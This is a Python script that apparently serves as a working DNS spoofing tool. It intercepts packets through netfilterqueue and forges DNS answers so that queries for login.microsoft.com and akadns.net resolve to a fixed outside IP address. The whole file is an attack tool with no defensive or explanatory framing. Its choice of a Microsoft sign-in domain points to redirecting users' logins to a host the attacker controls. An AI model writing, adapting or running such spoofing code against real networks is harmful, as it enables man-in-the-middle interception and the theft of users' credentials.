from scapy.all import *
import netfilterqueue

# Dictionary to track active DNS queries
query_tracker = {}

# Target domain and spoofed IP
TARGET_DOMAIN = "login.microsoft.com"
FAKE_IP = "3.149.241.54"

def process_packet(packet):
    """Process packets and spoof DNS responses only for the final query."""
    scapy_packet = IP(packet.get_payload())

    # Check if the packet has a DNS query
    if scapy_packet.haslayer(DNSQR):
        qname = scapy_packet[DNSQR].qname.decode()  # Extract queried domain
        print(f"[DNS] Packet: {scapy_packet.summary()} - Query: {qname}")

        # Track DNS queries
        if qname not in query_tracker:
            query_tracker[qname] = 1
        else:
            query_tracker[qname] += 1

        # If the query matches the target domain, spoof the response
        if TARGET_DOMAIN in qname or "akadns.net" in qname:
            print(f"[+] Spoofing DNS response for {qname}")

            # Create a fake DNS response
            answer = DNSRR(
                rrname=qname,  # Response name matches the query
                type="A",      # Response type
                rclass="IN",   # Response class
                ttl=300,       # Time to live
                rdlen=4,       # Length of the IP address in bytes
                rdata=FAKE_IP  # Spoofed IP address
            )
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1

            # Recalculate lengths
            scapy_packet[IP].len = 20 + 8 + len(bytes(scapy_packet[DNS]))  # IP header + UDP header + DNS payload
            scapy_packet[UDP].len = 8 + len(bytes(scapy_packet[DNS]))     # UDP header + DNS payload

            # Recalculate checksums
            del scapy_packet[IP].chksum  # Force IP checksum recalculation
            del scapy_packet[UDP].chksum  # Force UDP checksum recalculation

            # Print the modified packet
            print("[MODIFIED PACKET]")
            print(scapy_packet.show(dump=True))

            # Set the modified packet as the payload
            packet.set_payload(bytes(scapy_packet))
        else:
            print(f"[-] Passing DNS response for {qname}")
    else:
        print(f"[NON-DNS] Packet: {scapy_packet.summary()}")

    # Forward the packet
    packet.accept()



def checksum(data):
    """Calculate the checksum for the given data."""
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF





def main():
    """Main function to set up packet interception."""
    print("[*] Starting DNS spoofing script...")
    queue = netfilterqueue.NetfilterQueue()

    try:
        # Bind the queue to the process_packet function
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping script.")
    finally:
        queue.unbind()

if __name__ == "__main__":
    main()
